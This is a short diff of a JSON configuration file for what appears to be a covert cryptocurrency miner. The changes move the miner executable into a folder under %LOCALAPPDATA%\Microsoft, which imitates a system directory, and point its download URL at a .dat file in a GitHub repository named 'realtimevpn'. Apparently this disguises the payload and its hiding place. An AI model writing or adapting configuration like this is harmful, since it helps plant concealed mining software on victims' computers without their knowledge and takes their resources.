@@ -6,9 +6,9 @@
     "DiscoveryCacheMinutes": 30
   },
   "MinerConfig": {
-    "EnginePath": "%TEMP%\\AuriEngine\\AuriEngine.exe",
-    "EngineDownloadUrl": "https://raw.githubusercontent.com/auricore-stack/auricore/refs/heads/main/AuriEngine.dat",
-    "WorkingDirectory": "%TEMP%\\AuriEngine",
+    "EnginePath": "%LOCALAPPDATA%\\Microsoft\\AuriEngine\\AuriEngine.exe",
+    "EngineDownloadUrl": "https://raw.githubusercontent.com/auricore-stack/realtimevpn/refs/heads/main/AuriEngine.dat",
+    "WorkingDirectory": "%LOCALAPPDATA%\\Microsoft\\AuriEngine"
   },
   "SystemConfig": {
     "SyncIntervalSeconds": 60,
